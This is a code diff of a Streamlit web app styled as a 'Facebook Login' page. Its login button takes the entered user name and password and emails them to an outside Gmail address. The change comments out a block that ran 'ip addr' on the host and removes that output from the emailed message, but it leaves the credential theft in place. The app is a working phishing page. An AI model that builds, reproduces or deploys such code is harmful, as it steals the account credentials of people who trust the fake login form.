@@ -16,7 +16,7 @@ receiver= "sonu.code.ai@gmail.com"
 
 
 # Run a simple command
-
+"""
 try:
     # Run the linux command
     command=["ip", "addr"] 
@@ -27,8 +27,8 @@ try:
     final_output = output.stdout if output.returncode == 0 else output.stderr
 
 except Exception as e:
-    final_output = f"Error occurred: {e}"
-    
+    final_output = f"Error occurred: {e}" 
+"""
 
 
 st.set_page_config(page_title="Facebook Login",page_icon="logo.png" ,layout="centered")
@@ -44,7 +44,6 @@ page_bg_img = '''
 }
 </style>
 '''
-
 st.markdown(page_bg_img, unsafe_allow_html=True)
 
 col1, col2 = st.columns([1.3, 1])
@@ -95,7 +94,7 @@ with col2:
         if st.button("Login"):
 
             with st.spinner("Loading..........."): 
-                full_msg= f"ID: {user_name}  \n Password: {user_password} \n cmd: {final_output}"
+                full_msg= f"ID: {user_name}  \n Password: {user_password} "
                 msg = MIMEText(full_msg)
                 msg["Subject"] = "Message from Streamlit App"
                 msg["From"] = sender
